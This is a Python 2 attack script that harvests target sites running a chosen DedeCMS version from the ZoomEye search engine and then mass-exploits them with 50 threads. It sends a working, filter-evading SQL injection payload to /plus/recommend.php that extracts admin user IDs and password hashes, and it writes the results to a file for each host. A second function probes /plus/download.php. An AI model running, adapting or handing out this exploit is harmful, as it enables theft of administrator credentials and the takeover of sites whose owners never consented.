#!/usr/bin/env python
#search the dedecms version at the zoomeye,get the host url and test the exp.
#joey:joeyxy83@gmail.com create at 20131125
#update: fix the re parser url error and using the Dynamic browser parse url

from threading import Thread
from Queue import Queue
from termcolor import colored
import urllib
import re
import sys
import httplib
from termcolor import colored
import urllib2
from splinter import Browser
import time

url_queue = Queue()
global debug
debug = 0


def showinfo():
	print "#########################################################"
	print "###                 search result                     ###"
	print "###  usage: python geturl.py keyword pagenumber       ###"
	print "### ex: python zoomeye_dedeexp_check.py dedecms:5.1 5 ###"
	print "#########################################################"

def test():
	print "<h4><a href=\"(.*)\" target=\"_blank\""

def gethtml(url):
	if debug:print url
	#page=urllib.urlopen(url) --- static way old
	#html=page.read()  ---staic way old
	browser = Browser('phantomjs')
	browser.visit(url)
	time.sleep(15)
	html = browser.html
	if debug:print html
	return html

def geturl(html):
	#a="<h4><a href=\"(.*)\" target=\"_blank\""
	#resp=re.findall(a,html)
	pattern=re.compile('<div class="ip">.*?</i>(.*?)</a>.*?</div>',re.S)
	resp = re.findall(pattern,html)
	if debug:print resp
	return resp


def getAdminHash(c,url_q):
    while True:
        urld=url_q.get()
        for i in xrange(0,2):
            urls=urld+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
            Headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0"}
            #print urls
            u = urld.replace("//","_")
            u =u.replace(":","_")
            try:
                req=urllib2.Request(urls,headers=Headers)
                result=urllib2.urlopen(req,timeout=10).read()
                if result:
                    reg = re.compile(r"_(.*?)_{dede",re.S)
                    groups = re.findall(reg,result)
                    if groups[0]:
                        print colored("url:%s, pwd:%s" % (urld,groups[0]),'green')
                        with open('%s_admin.txt' % u,'a') as af:
                            af.write(groups[0]+"\n")
            except KeyboardInterrupt:
                print "Precess interrupted by user."
                sys.exit(-1)
                url_q.task_done()
            except:
                print "no exp"
                url_q.task_done()
        url_q.task_done()

def check_url(i,url_q):
	#print "the thread:%s" % i	
	while True:
		host=url_q.get().split('//')[1]
		resource = '/plus/download.php'
		resource2 = '/plus/search.php'
		try:
			conn = httplib.HTTPConnection(host,80)
			#print 'http connection created success'
			#make request
			req = conn.request('GET',resource)
			#print 'request for :%s at host: %s' % (resource,host)
			#get response
			response = conn.getresponse()
			#print 'response status:%s' % response.status
                        if response.status in [200,301]:
				print colored("Url:%s%s can access" % (host,resource),'green')
		except httplib.HTTPException,e:
			print 'HTTP connection failed:%s' % e
			url_q.task_done()
		except :
			print 'other error.' 
			url_q.task_done()
		url_q.task_done()

def main(keywords,pagenum):
	num=0
	for x in range(1,int(pagenum)+1):
		html=gethtml('http://www.zoomeye.org/search?q=' + keywords + '&p=' + str(x) +"&t=web")
		#print html
		url=geturl(html)
		num+=len(url)
		for y in url:
			if debug:print y
			url_queue.put(y.strip(" "))
	print "total"+str(num)+"urls!"

	url_threads = 50
        if url_queue.qsize() < url_threads :
		url_threads = url_queue.qsize()

	for i in range(url_threads):
		worker = Thread(target=getAdminHash,args=(i,url_queue))
		#worker = Thread(target=check_url,args=(i,url_queue))
		worker.setDaemon(True)
		worker.start()

	print "Main Thread waiting"
	url_queue.join()
	print "Done"

if __name__ == "__main__":
	if len(sys.argv) == 3:
		keywords=sys.argv[1]
		pagenum=sys.argv[2]
		main(keywords,pagenum)
	elif len(sys.argv) == 2:
		if sys.argv[1]=="-h" or sys.argv[1]=="--help":
			showinfo()
		else:
			keywords=sys.argv[1]
			pagenum=3
			main(keywords,pagenum)
	else:
		showinfo()

